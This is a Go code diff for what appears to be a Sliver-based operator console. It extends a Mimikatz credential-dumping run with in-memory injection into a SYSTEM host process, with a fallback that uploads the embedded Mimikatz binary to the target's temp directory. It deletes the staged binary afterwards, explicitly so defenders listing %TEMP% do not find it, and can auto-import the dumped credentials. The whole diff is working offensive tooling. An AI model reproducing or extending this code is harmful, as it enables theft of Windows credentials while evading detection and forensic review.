@@ -83,6 +83,13 @@ type MimikatzRequest struct {
 	// HostingProcess is the SYSTEM process the escalation injects into. Empty
 	// lets sliver choose from its built-in list.
 	HostingProcess string `json:"hostingProcess"`
+	// Mode selects how the payload reaches the target: auto, memory or upload.
+	// Empty means auto, which is what a client that predates this field sends.
+	Mode string `json:"mode"`
+	// Process is the sacrificial process a memory-mode run is injected into.
+	// Empty uses the console's default. It is a path, not a pid: Sliver's
+	// sideload starts this process rather than injecting into a running one.
+	Process string `json:"process"`
 }
 
 // MimikatzResult is the JSON shape returned to the console.
@@ -102,6 +109,16 @@ type MimikatzResult struct {
 	// Integrity is the token integrity observed before the run, when it could be
 	// read. "Medium" is the answer that explains an LSA access-denied.
 	Integrity string `json:"integrity"`
+	// Mode is the route the payload actually took. It can differ from the one
+	// requested: auto falls back to a disk write when the payload cannot be
+	// injected, and the operator needs to see that it did.
+	Mode string `json:"mode,omitempty"`
+	// TargetPath is the file written on the target. Empty on an in-memory run.
+	TargetPath string `json:"targetPath,omitempty"`
+	// Execution describes what ran before the payload started -- which host
+	// process, or why the disk path was used instead. Shown beside the
+	// credentials so a run is auditable without reading the raw output.
+	Execution string `json:"execution,omitempty"`
 }
 
 // providerSections are the sub-blocks sekurlsa prints. Only these are treated
@@ -591,17 +608,25 @@ func (c *Client) executeWithTimeout(sessionID, path string, args []string, op ti
 	return c.execOn(sessionID, "", path, args, op)
 }
 
-// MimikatzRun uploads the binary when one is supplied, runs the command, parses
-// the output, and optionally imports what it found.
+// MimikatzRun executes a credential-dumping command, parses the output, and
+// optionally imports what it found.
+//
+// The payload reaches the target one of two ways, chosen by req.Mode: written to
+// the target's temp directory and executed, or injected into a host process
+// without ever touching the disk. The in-memory routes live in mimikatz_memory.go
+// because that path has its own rules about when refusal is the right answer.
 func (c *Client) MimikatzRun(sessionID string, req MimikatzRequest, originUUID string) (*MimikatzResult, error) {
 	command := strings.TrimSpace(req.Command)
 	if command == "" {
 		command = DefaultMimikatzCommand
 	}
-	// The binary is embedded and written to the target on every run. There is no
-	// path for the operator to choose any more.
+	mode := normalizeMimikatzMode(req.Mode)
+	// An empty Upload means "use the tool this console ships". A non-empty one is
+	// a payload the operator supplied, which changes which in-memory loaders can
+	// apply, so the distinction is carried into the run rather than flattened.
+	custom := len(req.Upload) > 0
 	payload := req.Upload
-	if len(payload) == 0 {
+	if !custom {
 		payload = embed.Mimikatz
 	}
 	if len(payload) == 0 {
@@ -628,24 +653,62 @@ func (c *Client) MimikatzRun(sessionID string, req MimikatzRequest, originUUID s
 		}
 	}
 
-	// Upload after escalating, not before: the temp directory is per-session, so
-	// a run that escalates to SYSTEM must write into SYSTEM's temp rather than
-	// the original user's. Writing first would leave the binary in a directory
-	// the elevated process may not be able to read, which surfaces as a launch
-	// failure that looks like a broken payload.
-	path := c.mimikatzTargetPath(target)
-	if err := c.Upload(target, path, payload); err != nil {
-		return nil, fmt.Errorf("upload %s: %w", path, err)
+	// --- Execution ---------------------------------------------------------
+	//
+	// The in-memory route is attempted for every mode except an explicit upload.
+	// Auto falls back to the disk path when the payload cannot be injected; an
+	// explicit memory request is refused instead, because silently writing a
+	// file answers a question the operator did not ask.
+	var executionNote string
+	if mode != MimikatzModeUpload {
+		raw, note, err := c.runMimikatzInMemory(target, command, payload, custom, req.Process)
+		if err != nil {
+			if mode == MimikatzModeMemory {
+				return nil, err
+			}
+			executionNote = "内存加载不可用，已回退到上传执行（" + err.Error() + "）"
+			mode = MimikatzModeUpload
+		} else {
+			result.Mode = MimikatzModeMemory
+			result.Execution = note
+			result.Raw = raw
+			result.Parsed = ParseMimikatz(result.Raw, command)
+		}
 	}
-	// "exit" keeps the tool from dropping into its interactive prompt, which
-	// would hold the pipe open until the timeout instead of returning output.
-	out, err := c.executeWithTimeout(target, path, []string{command, "exit"}, mimikatzTimeout)
-	if err != nil {
-		return nil, err
+
+	if mode == MimikatzModeUpload {
+		// Stage after escalating, not before: the temp directory is per-session,
+		// so a run that escalates to SYSTEM must write into SYSTEM's temp rather
+		// than the original user's. Writing first would leave the binary in a
+		// directory the elevated process may not be able to read, which surfaces
+		// as a launch failure that looks like a broken payload.
+		path := c.mimikatzTargetPath(target)
+		if err := c.Upload(target, path, payload); err != nil {
+			return nil, fmt.Errorf("upload %s: %w", path, err)
+		}
+		// "exit" keeps the tool from dropping into its interactive prompt, which
+		// would hold the pipe open until the timeout instead of returning output.
+		out, err := c.executeWithTimeout(target, path, []string{command, "exit"}, mimikatzTimeout)
+		if err != nil {
+			return nil, err
+		}
+		result.Mode = MimikatzModeUpload
+		result.TargetPath = path
+		result.ExitCode = out.Status
+		result.Raw = strings.TrimSpace(out.Stdout + "\n" + out.Stderr)
+		result.Parsed = ParseMimikatz(result.Raw, command)
+
+		// The binary is removed once it has run. A temp directory is not a hiding
+		// place: leaving it there means the next person to list %TEMP% finds the
+		// tool that was used against the host.
+		if note := c.cleanupStagedFile(target, path); note != "" {
+			executionNote = note
+		}
 	}
-	result.ExitCode = out.Status
-	result.Raw = strings.TrimSpace(out.Stdout + "\n" + out.Stderr)
-	result.Parsed = ParseMimikatz(result.Raw, command)
+
+	if executionNote != "" {
+		result.Execution = strings.TrimSpace(result.Execution + " " + executionNote)
+	}
 
 	if req.AutoAdd {
 		added, err := c.MimikatzImport(result.Parsed, originUUID)
